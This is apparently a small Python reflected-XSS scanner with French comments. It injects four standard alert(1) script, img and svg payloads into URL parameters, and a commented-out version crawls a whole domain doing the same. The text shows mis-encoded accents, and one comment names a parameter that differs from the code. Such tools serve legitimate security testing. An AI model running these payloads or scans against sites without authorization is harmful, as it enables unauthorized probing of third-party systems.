### VÃ©rification de faille XSS sur site

import requests

# Liste des payloads XSS simples
xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

def check_xss_vulnerability(url):
    print(f"Scanning URL : {url}")
    for payload in xss_payloads:
        # Envoie la requÃªte avec le payload dans le paramÃ¨tre 'q'
        target_url = f"{url}?download={payload}"
        response = requests.get(target_url)

        # VÃ©rifie si le payload est prÃ©sent dans la rÃ©ponse
        if payload in response.text:
            print(f"VulnÃ©rabilitÃ© XSS dÃ©tectÃ©e avec le payload : {payload}")
        else:
            print(f"Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e pour le payload : {payload}")

if __name__ == "__main__":
    target_url = input("Entrez l'URL Ã  scanner (ex: http://example.com/search): ")
    check_xss_vulnerability(target_url)


# import requests
# from bs4 import BeautifulSoup
# import urllib.parse
#
# xss_payloads = [
#     "<script>alert(1)</script>",
#     "\"'><script>alert(1)</script>",
#     "<img src=x onerror=alert(1)>",
#     "<svg onload=alert(1)>"
# ]
#
# visited = set()
#
# def crawl_and_test(url, domain):
#     if url in visited:
#         return
#     visited.add(url)
#
#     # print(f"ğŸŒ Exploration de : {url}")  # <= debug pour suivre le crawl
#
#     try:
#         response = requests.get(url, timeout=5)
#     except:
#         return
#
#     # Si le Content-Type n'est pas HTML, on saute
#     if "text/html" not in response.headers.get("Content-Type", ""):
#         return
#
#     # Test XSS sur les paramÃ¨tres de cette URL
#     test_xss(url)
#
#     # Crawler les liens internes
#     try:
#         soup = BeautifulSoup(response.content, "lxml")  # parser plus tolÃ©rant
#     except Exception as e:
#         print(f"âš ï¸ Impossible dâ€™analyser {url} : {e}")
#         return
#
#     for link in soup.find_all("a", href=True):
#         new_url = urllib.parse.urljoin(url, link["href"])
#         if domain in new_url:  # rester dans le mÃªme domaine
#             crawl_and_test(new_url, domain)
#
# def test_xss(url):
#     parsed = urllib.parse.urlparse(url)
#     params = urllib.parse.parse_qs(parsed.query)
#
#     # S'il n'y a pas de paramÃ¨tres, on en crÃ©e un factice
#     if not params:
#         params = {"xss": ["test"]}
#
#     for param in params:
#         for payload in xss_payloads:
#             test_params = params.copy()
#             test_params[param] = payload
#             test_query = urllib.parse.urlencode(test_params, doseq=True)
#             test_url = urllib.parse.urlunparse(
#                 (parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment)
#             )
#
#             try:
#                 r = requests.get(test_url, timeout=5)
#                 if payload in r.text:
#                     print(f"ğŸ’¥ XSS dÃ©tectÃ©e : {test_url} (paramÃ¨tre {param})")
#                 elif urllib.parse.quote(payload) in r.text:
#                     print(f"âš ï¸ Potentielle XSS encodÃ©e : {test_url} (paramÃ¨tre {param})")
#                 else:
#                     print(f"âœ… Rien trouvÃ© sur {test_url} (paramÃ¨tre {param})")
#             except:
#                 pass
#
# if __name__ == "__main__":
#     target = input("Entrez une URL (ex: http://example.com/search): ")
#     domain = urllib.parse.urlparse(target).netloc
#     crawl_and_test(target, domain)